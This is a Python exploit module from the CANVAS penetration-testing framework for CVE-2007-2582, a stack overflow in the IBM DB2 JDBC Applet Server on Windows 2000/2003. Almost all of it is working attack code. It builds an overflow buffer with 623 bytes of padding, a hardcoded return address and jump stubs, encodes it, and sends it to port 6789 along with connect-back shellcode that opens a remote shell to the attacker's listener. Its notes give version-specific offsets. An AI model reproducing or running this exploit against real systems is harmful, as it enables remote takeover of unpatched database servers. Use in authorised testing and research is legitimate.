#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='IBM DB2 JDBC Applet Server Overflow'
DESCRIPTION='Stack overflow vulnerability in IBM DB2 JDBC Applet Server'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IBM"
DOCUMENTATION['Date public']='10/10/07'
DOCUMENTATION["CVE Name"] = "CVE-2007-2582"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2582"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-056.html'
DOCUMENTATION['Notes']=''
DOCUMENTATION['Repeatability']=''

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']

CHANGELOG="""
"""

NOTES="""
FixPak 12:
var_28C receives '(null)XXXAAAA....'
Two pointers at var_10 and var_14 will be overwritten, ideally by something pointing to a \x00-filled area
In older versions (FixPak 7 for example), it uses var_27C due to stack variables reordering, and no pointers are overwritten
FixPak 10, 12: AAAA...AAAA(623) 7ffe0ff0 7ffe0ff0 AAAAAAAAAAAAAAAA BBBBCCCCCC
FixPak  7, 8a: AAAA...AAAA(623) AAAA     AAAA     BBBBCCCCCC
Merged       : AAAA...AAAA(623) 7ffe0ff0 7ffe0ff0 BBBBCCCCCCAAAAAA BBBBCCCCCC
SEH varies too much between FixPaks and OSes to be reliably used
Possible return address: 0x7732c167 push esp & ret @ mprapi.dll v5.0.2181.1 (English only)
"""

targets={
    0: ['Autoversioning (N/A)',0],
    1: ['IBM DB2 8.2 on Windows 2000 English',0x7732c167], #push esp,retn 0x7732 :(
    #2: ['IBM DB2 8.2 on Windows 2000 Japanese',0x772dc167], #push esp,retn 0x7732 :(
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)
        self.covertness=0
        self.badstring='\0'
        self.port=6789
        return
   
    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createSmallWin32Shellcode(self.callback.ip,self.callback.port,subesp=31200)
        #return self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)

    def encodeBuffer(self, buffer):
        chararray=[0x20ac,0x81,0x201a,0x192,0x201e,0x2026,0x2020,0x2021,0x2c6,0x2030,0x160,0x2039,0x152,0x8d,0x17d,0x8f,0x90,0x2018,0x2019,0x201c,0x201d,0x2022,0x2013,0x2014,0x2dc,0x2122,0x161,0x203a,0x153,0x9d,0x17e,0x178]
        data=''
        for i in range(len(buffer)):
            b=ord(buffer[i])
            if b>=0x80 and b<0xa0:
                h=chararray[b-0x80]
            else:
                h=b
            data+=struct.pack('>H',h)
        return data

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.eip=targets[self.version]
        self.setProgress(25)

        #self.shellcode='\xcc'+self.shellcode #DEBUG
        buffer= self.shellcode
        buffer+='A'*(623-len(buffer))
        buffer+=struct.pack('<LL',0x7ffe0ff0,0x7ffe0ff0)
        buffer+=struct.pack('<L',self.eip)
        buffer+='\xeb\x0e' #jmp over
        buffer+='B'*10
        buffer+=struct.pack('<L',self.eip)
        buffer+=mosdef.assemble('jmp $-%d'%(len(buffer)+5),'X86') #jmp back
        data=self.encodeBuffer(buffer)
        data=struct.pack('>HL',118,len(data)/2)+data+struct.pack('>L',0)
        data='ValidDb2jdTokenFromTheClientSide'+struct.pack('>HL',1,len(data))+data
        self.setProgress(50)

        try:
            s=self.gettcpsock()
            s.connect((self.host,self.port))
        except:
            self.log('Attack reported no open socket - service died?')
            self.setInfo('%s attacking %s:%d - done (failed?)'%(NAME,self.host,self.port))
            return 0
        s.sendall(data)
        self.setProgress(75)

        time.sleep(3)
        self.setProgress(100)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(NAME,self.host,self.port))
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(NAME,self.host,self.port))
        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d : %s'%(i,listline[0])
            i=i+1
        return

if __name__=='__main__':
    print 'Running CANVAS '+NAME+' version '+VERSION
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
